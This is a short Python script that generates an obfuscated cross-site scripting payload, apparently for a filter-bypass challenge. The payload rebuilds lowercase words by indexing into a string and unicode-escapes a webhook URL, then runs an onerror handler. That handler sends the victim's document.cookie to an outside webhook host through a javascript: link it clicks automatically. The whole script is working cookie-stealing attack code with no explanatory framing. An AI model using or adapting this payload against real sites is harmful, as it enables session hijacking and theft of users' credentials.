import re

def gen_str(s):
	chars = []
	for c in s:
		if c.islower():
			idx = ord(c) - ord("a")
			chars.append(f"X[{idx}]")
		elif c == "`":
			chars.append(f"`\\``")
		elif c == "\\":
			chars.append(f"`\\\\`")
		else:
			chars.append(f"`{c}`")
	return "+".join(chars)

def gen_unicode_str(s):
	return "".join([f"\\u{ord(c):04X}" for c in s])

webhook = "https://webhook.example.com/?"

payload = "<A ID=A HREF=ABCDEFGHIJKLMNOPQRSTUVWXYZ:>"
payload += "<IMG SRC ONERROR="
payload += "X=A+``;"
payload += f"HREF={gen_str('href')};"
payload += f"CLICK={gen_str('click')};"
payload += f"COOKIE={gen_str('cookie')};"
payload += f"A[HREF]={gen_str(f'javascript:location[HREF]=`{gen_unicode_str(webhook)}`+document[COOKIE]')};"
payload += f"A[CLICK]``;"
payload += ">"

print(payload)